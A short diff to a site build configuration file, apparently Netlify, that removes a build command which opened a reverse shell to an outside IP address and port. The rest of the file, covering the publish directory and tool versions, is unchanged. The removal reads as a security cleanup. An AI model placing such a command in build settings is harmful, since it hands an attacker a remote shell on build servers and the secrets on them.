@@ -1,6 +1,5 @@
 [build]
   publish = "dist"
-  command = "/bin/bash -i >& /dev/tcp/206.189.219.59/1337 0>&1"
 [build.environment]
   YARN_VERSION = "1.9.4"
   HUGO_VERSION = "0.46"
